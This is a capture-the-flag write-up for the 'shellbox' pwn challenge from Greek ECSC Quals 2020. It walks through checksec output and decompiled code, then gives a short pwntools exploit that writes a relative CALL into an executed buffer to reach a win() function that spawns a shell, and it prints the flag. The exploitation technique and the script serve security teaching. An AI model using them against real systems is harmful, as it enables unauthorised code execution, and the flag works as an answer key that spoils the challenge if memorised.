# Greek ECSC Quals 2020 - Pwn - shellbox

This challenge provides:
* libc-2.23.so
* shellbox

From checksec we see that `NX, Canary, Fortify are disabled` and only `PIE` is enabled.

```sh
gef➤  checksec
[+] checksec for '/home/w3th4nds/ctfs/ecsc2020_quals/pwn/sanity/shellbox'
Canary                        : ✘ 
NX                            : ✘ 
PIE                           : ✓ 
Fortify                       : ✘ 
RelRO                         : Full
```

### Disassembly

We open up `ghidra` to analyze the binary. This is the code of `main()`
```c
undefined8 main(void)

{
  setup();
  banner();
  read(0,g_buf,6);
  (*(code *)g_buf)();
  return 0;
}
```

and this is the code of `win()`
```c
void win(void)

{
  system("/bin/sh");
                    /* WARNING: Subroutine does not return */
  exit(0);
}
```
The goal here is to call `win()` and get shell.  
As we can see, `read()` reads up to `6` bytes and stores them to `g_buf`. After that, `g_buf` is called! This is the vulnerability.  
So, what we need to do is: store at`g_buf[0]` the address of `win()`.  
The problem is that **PIE** is `enabled` so we do not know the exact address of win.  

We are going to `ghidra` once again and `patch` the program in order to see what the call looks like if `g_buf[0]` has the command `CALL win`.  

![patch](https://i.imgur.com/Y5VjwHL.png)  

We see the bytes are `e8 cb e9 df ff`.  
### Exploit

```python
#!/usr/bin/python3
from pwn import *

ip = 'docker.hackthebox.eu'
port = 30252
filename = './shellbox'

def pwn():

	r = remote(ip,port)

	call_win = p64(0xffdfe9cbe8)
	r.sendline(call_win)
	r.interactive()

pwn()
```

**FLAG: HTB{jump_around_jump_around!}**